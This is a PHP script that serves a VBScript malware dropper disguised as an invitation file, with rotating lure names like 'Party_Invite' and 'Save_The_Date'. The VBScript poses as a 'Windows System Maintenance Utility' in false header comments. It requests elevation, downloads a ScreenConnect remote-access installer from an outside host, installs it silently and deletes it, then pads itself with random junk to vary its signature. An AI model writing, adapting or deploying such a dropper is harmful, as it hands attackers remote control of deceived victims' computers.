<?php
// invite.php - Benign header + No Persistence + No Defender Exclusion
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);

if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$sessionId = bin2hex(random_bytes(24));
$ts = time();
$randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
$xorKey = rand(100, 255);

$junkLines = rand(5, 25);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "' Junk " . bin2hex(random_bytes(rand(6, 14))) . "\n";
}

echo <<<VBS
' ========================================================
' Windows System Maintenance Utility
' Version: 3.1.8
' Description: Performs routine system health checks,
' applies recommended configuration updates, and ensures
' optimal performance on Windows 10 and Windows 11.
' Compatible with standard user and elevated environments.
' ========================================================
' This script is intended for legitimate system maintenance
' purposes only. It does not collect personal data.
' ========================================================

' Configuration section - do not modify
Const SCRIPT_VERSION = "3.1.8"
Const LOG_ENABLED = False

' Placeholder for future expansion
Dim configReady
configReady = True

' End of configuration header
' ========================================================

Dim $randV1, objShell, objFSO
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

$randV1 = "$sessionId"

Function D(s)
    Dim i, r : r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
    Next
    D = r
End Function

' ===== ELEVATION =====
If WScript.Arguments.Length = 0 Then
    Dim shell
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit
End If

Sub DownloadAndExecute()
    On Error Resume Next
    Dim u, p, http, strm
    u = "$scUrl"
    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
  
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", u, False
    http.Send
    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        objShell.Run """" & p & """ /quiet", 0, True
        WScript.Sleep 90000
        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
    End If
End Sub

' ===== MAIN =====
Call DownloadAndExecute

$junk
WScript.Quit
VBS;
?>
